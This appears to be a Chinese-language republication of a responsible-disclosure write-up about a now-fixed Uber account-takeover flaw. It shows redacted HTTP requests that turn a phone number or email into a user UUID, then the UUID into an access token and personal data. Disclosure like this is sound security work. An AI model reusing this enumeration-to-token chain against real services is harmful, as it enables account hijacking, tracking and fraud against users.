***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**  

![](https://image.3001.net/images/20190916/1568644569_5d7f9dd9a4267.jpg!small)

**本文涉及的漏洞为Uber的任意账户劫持漏洞，漏洞影响Uber的司机、打车乘客(Rider)、第三方合作伙伴以及餐饮外送(Eats)注册账户，攻击者可通过一个Uber
API接口获得用户注册账户的UUID，然后利用UUID通过另一Uber
API接口发起请求，从其响应中获得与UUID对应账户的访问控制令牌(token)信息，从而实现账户劫持。漏洞最终获得Uber官方奖励的$6500美金。**

##  漏洞概况及影响

问题首先出在Uber的一个API接口中，如果在其POST请求中提供用户注册预留的手机号码或电邮地址，Uber后端服务即能响应返回相应用户账户的UUID号；之后，在另一Uber
API接口中，通过利用获取的用户UUID号可进一步获取相应用户对Uber移动应用APP的访问控制令牌(Access
Token)，有了该访问控制令牌(token)，可以对受害者发起账户劫持、位置跟踪、钱款交易和下载乘车路线等操作，严重危及受害者账户安全。

##  漏洞复现

###  步骤1 从API中获取任意Uber注册用户的UUID号

在Uber的以下API接口POST请求中，如果提供用户（第三方合作伙伴、乘客、餐饮外送注册账户）的注册预留手机号码或电子邮箱地址，请求执行后，在响应消息中我们将会获得用户的UUID号信息。如以下通过用户注册预留手机号码获取用户的UUID：

请求：

    
    
    POST /p3/fleet-manager/\_rpc?rpc=addDriverV2 HTTP/1.1
    
        Host: partners.uber.com
    
        {“nationalPhoneNumber”:” **99999xxxxx** ”,”countryCode”:”1"}

响应：

    
    
    {
    
            “status”:”failure”,
    
            ”data”: {
    
                “code”:1009,
    
                ”message”:”Driver ‘ **47d063f8–0xx5e-xxxxx-b01a-xxxx** ’ not found”
    
                }
    
        }

如果在请求中提供用户的注册预留手机号99999xxxxx，则响应消息中将返回用户的UUID号：‘47d063f8–0xx5e-4eb4-xxx-xxxxxxx’。

以下通过用户注册预留的邮箱地址获取用户的UUID：

请求：

    
    
    POST /p3/fleet-manager/\_rpc?rpc=addDriverV2 HTTP/1.1
    
        Host: partners.uber.com
    
        {“email”:” **xxx@gmail.com** ”}

响应：

    
    
    {
    
            “status”:”failure”,
    
            ”data”: {
    
                “code”:1009,
    
                ”message”:”Driver ‘ **ca111b95–1111–4396-b907–83abxxx5f7371e** ’ not found”
    
            }
    
        }

用户注册预留电邮地址address
xxx@gmail.com，同样Uber后端响应返回用户UUID号：‘Ca111b95–1111–4396-b907–83abxxx5f7371e’ 。

###  步骤 2 从另一API中获取UUID对应的访问控制令牌(token)

获取到上述任意用户UUID号之后，在另一Uber
API接口中，通过利用获取的用户UUID号可进一步获取相应用户对Uber移动应用APP的访问控制令牌(Access
Token)、地理位置、家庭地址等敏感信息。有了访问控制令牌(Access
Token)后，也就能完全劫持任意Uber账户了，从受害者账户中可以看到他的乘车路线、打车请求、付款信息等等。以下为我的测试账号证明。

通过另一Uber API获得访问控制令牌(Access Token)等信息：

请求：

    
    
    POST /marketplace/\_rpc?rpc=getConsentScreenDetails HTTP/1.1
    
        Host: bonjour.uber.com
    
        Connection: close
    
        Content-Length: 67
    
        Accept: application/json
    
        Origin: [[https://bonjour.uber.com](https://bonjour.uber.com/)]([https://bonjour.uber.com](https://bonjour.uber.com/))
    
        x-csrf-token: xxxx
    
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
    
        DNT: 1
    
        Content-Type: application/json
    
        Accept-Encoding: gzip, deflate
    
        Accept-Language: en-US,en;q=0.9
    
        Cookie: xxxxx
    
        {“language”:”en”,”userUuid”:” **xxxx–776–4xxxx1bd-861a-837xxx604ce** ”}

上述请求包含的UUID为：xxxx–776–4xxxx1bd-861a-837xxx604ce，以该身份执行请求后，Uber后端的响应如下：

    
    
    {
    
           “status”:”success”,
    
           ”data”:{
    
              “data”:{
    
                 “language”:”en”,
    
                 ”userUuid”:”xxxxxx1e”
    
              },
    
              ”getUser”:{
    
                 “uuid”:”cxxxxxc5f7371e”,
    
                 ”firstname”:”Maxxxx”,
    
                 ”lastname”:”XXXX”,
    
                 ”role”:”PARTNER”,
    
                 ”languageId”:1,
    
                 ”countryId”:77,
    
                 ”mobile”:null,
    
                 ”mobileToken”:1234,
    
                 ”mobileCountryId”:77,
    
                 ”mobileCountryCode”:”+91",
    
                 ”hasAmbiguousMobileCountry”:false,
    
                 ”lastConfirmedMobileCountryId”:77,
    
                 ”email”:”xxxx@gmail.com”,
    
                 ”emailToken”:”xxxxxxxx”,
    
                 ”hasConfirmedMobile”:”no”,
    
                 ”hasOptedInSmsMarketing”:false,
    
                 ”hasConfirmedEmail”:true,
    
                 ”gratuity”:0.3,
    
                 ”nickname”:”abc@gmail.com”,
    
                 ”location”:”00000",
    
                 ”banned”:false,
    
                 ”cardio”:false,
    
                 **”token”:”b8038ec4143bb4xxxxxx72d”** ,
    
                 ”fraudScore”:0,
    
                 ”inviterUuid”:null,
    
                 ”pictureUrl”:”xxxxx.jpeg”,
    
                 ”recentFareSplitterUuids”:[
    
                    “xxx”
    
                 ],
    
                 ”lastSelectedPaymentProfileUuid”:”xxxxxx”,
    
                 ”lastSelectedPaymentProfileGoogleWalletUuid”:null,
    
                 ”inviteCode”:{
    
                    “promotionCodeId”:xxxxx,
    
                    ”promotionCodeUuid”:”xxxx”,
    
                    ”promotionCode”:”manishas105",
    
                    ”createdAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,76,2,21,215,101]
    
                    },
    
                    ”updatedAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,76,65,211,61,9]
    
                    }
    
                 },
    
                 ”driverInfo”:{
    
                    “contactinfo”:”999999999xx”,
    
                    ”contactinfoCountryCode”:”+91",
    
                    ”driverLicense”:”None”,
    
                    ”firstDriverTripUuid”:null,
    
                    ”iphone”:null,
    
                    ”partnerUserUuid”:”xxxxxxx”,
    
                    ”receiveSms”:true,
    
                    ”twilioNumber”:null,
    
                    ”twilioNumberFormatted”:null,
    
                    ”cityknowledgeScore”:0,
    
                    ”createdAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,84,21,124,80,52]
    
                    },
    
                    ”updatedAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,86,152,77,41,77]
    
                    },
    
                    ”deletedAt”:null,
    
                    ”driverStatus”:”APPLIED”,
    
                    ”driverFlowType”:”UBERX”,
    
                    ”statusLocks”:null,
    
                    ”contactinfoCountryIso2Code”:”KR”,
    
                    ”driverEngagement”:null,
    
                    ”courierEngagement”:null
    
                 },
    
                 ”partnerInfo”:{
    
                    “address”:”Nxxxxxxx”,
    
                    ”territoryUuid”:”xxxxxx”,
    
                    ”company”:”None”,
    
                    ”address2":”None”,
    
                    ”cityId”:130,
    
                    ”cityName”:”None”,
    
                    ”firstPartnerTripUuid”:null,
    
                    ”preferredCollectionPaymentProfileUuid”:null,
    
                    ”phone”:””,
    
                    ”phoneCountryCode”:”+91",
    
                    ”state”:”None”,
    
                    ”vatNumber”:”None”,
    
                    ”zipcode”:”None”,
    
                    ”createdAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,84,21,124,80,52]
    
                    },
    
                    ”updatedAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,101,38,177,88,137
    
                       ]
    
                    },
    
                    ”deletedAt”:null,
    
                    ”fleetTypes”:[
    
                    ],
    
                    ”fleetServices”:[
    
                    ],
    
                    ”isFleet”:true
    
                 },
    
                 ”analytics”:{
    
                    “signupLat”:133.28741199,
    
                    ”signupLng”:11177.1111,
    
                    ”signupTerritoryUuid”:”xxxxx”,
    
                    ”signupPromoId”:null,
    
                    ”signupForm”:”iphone”,
    
                    ”signupSessionId”:”xxxxxxx”,
    
                    ”signupAppVersion”:”2.64.1",
    
                    ”signupAttributionMethod”:null,
    
                    ”createdAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,76,2,21,219,1]
    
                    },
    
                    ”updatedAt”:{
    
                       “type”:”Buffer”,
    
                       ”data”:[0,0,1,76,2,21,219,1
    
                       ]
    
                    },
    
                    ”signupCityId”:130,
    
                    ”signupDeviceId”:null,
    
                    ”signupReferralId”:null,
    
                    ”signupPromoCode”:null,
    
                    ”signupPromoCodeUuid”:null,
    
                    ”signupPromoUuid”:null,
    
                    ”signupMethod”:”REGULAR”
    
                 },
    
                 ”createdAt”:{
    
                    “type”:”Buffer”,
    
                    ”data”:[0,0,1,76,2,21,215,153]
    
                 },
    
                 ”updatedAt”:{
    
                    “type”:”Buffer”,
    
                    ”data”:[0,0,1,102,81,35,153,135]
    
                 },
    
                 ”deletedAt”:null,
    
                 ”tenancy”:”uber/production”,
    
                 ”mobileConfirmationStatus”:”MOBILE_NOT_CONFIRMED”,
    
                 ”nationalId”:null,
    
                 ”nationalIdType”:null,
    
                 ”merchantLocation”:null,
    
                 ”lastConfirmedMobile”:”xxxxxxxxxx”,
    
                 ”requestedDeletionAt”:null,
    
                 ”dateOfBirth”:xxxxxx,
    
                 ”userTypes”:null,
    
                 ”preferredName”:”xxxxxxxx”,
    
                 ”freightInfo”:null,
    
                 ”tempPictureUrl”:null,
    
                 ”identityVerified”:null,
    
                 ”paymentEntityType”:null,
    
                 ”riderEngagement”:null,
    
                 ”identityRejectReasonUuid”:null,
    
                 ”genderInferred”:null,
    
                 ”genderIdentity”:null,
    
                 ”genderDocumented”:null,
    
                 ”riderIneligibleWdw”:null,
    
                 ”defaultPaymentProfileByProduct”:null,
    
                 ”loginEligibility”:null
    
              },
    
              ”getDisclosureVersionUuid”:””,
    
              ”getLocaleCopy”:null
    
           }
    
        }

可见，响应消息中返回与UUID对应账户的所有敏感信息，其中包括了用户对Uber移动应用APP的访问控制令牌信息，通过对该令牌信息的利用，即可实现对任意Uber账户的劫持。漏洞上报后，Uber方面及时通过对当前请求执行授权限制，并删除了响应消息中的敏感信息，以此修复了该漏洞。

##  漏洞上报及处理进程

> 2019.4.19 漏洞初报
>
> 2019.4.25 漏洞分类
>
> 2019.4.26 漏洞修复 获得Uber官方奖励的 $6500
>
> 2019.6.28 我申请披露漏洞
>
> 2019.9.9 Uber披露漏洞

***参考来源：[appsecure](https://appsecure.security/blog/how-i-could-have-hacked-your-uber-account)，clouds编译整理，转载请注明来自FreeBuf.COM**

  

